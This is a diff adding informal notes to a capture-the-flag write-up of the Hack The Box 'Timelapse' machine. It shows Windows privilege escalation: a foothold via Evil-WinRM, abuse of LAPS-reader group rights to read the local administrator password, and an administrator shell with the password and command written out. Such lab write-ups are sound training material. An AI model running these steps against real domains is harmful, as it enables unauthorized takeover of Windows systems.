@@ -176,6 +176,33 @@ exit
 *Evil-WinRM* PS C:\Users> $c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)
 *Evil-WinRM* PS C:\Users> 
 ```
+- itry to connect with pS remoring but i got and error certificate expireed
+- try evilwinrm with the creds
+- i got in with user svc_deploy
+- it has the same permisions
+- we check the groups with svc_deploy with netuser and it has LAP_readers Group i think we can access to read from LAPS
+- **With LAPS, the DC manages the local administrator passwords for computers on the domain. It is common to create a group of users and give them permissions to read these passwords, allowing the trusted administrators access to all the local admin passwords.**
+- To read the LAPS password: use Get-ADComputer and specifically request the ms-mcs-admpwd property
+- now we got password for the local admin
+- reconnect with evil-winrm **evil-winrm -i timelapse.htb -S -u administrator -p '5r4]VTk[#)[4A)pQ{[0s9Jrh'**
+```
+evil-winrm -i timelapse.htb -S -u administrator -p '5r4]VTk[#)[4A)pQ{[0s9Jrh'
+                                        
+Evil-WinRM shell v3.5
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Warning: SSL enabled
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
+timelapse\administrator
+*Evil-WinRM* PS C:\Users\Administrator\Documents> 
+```
+-We got ROOOT
+- the root flag is missing but there are other users we check TRX user annd found it on thier desktop
 
 
 
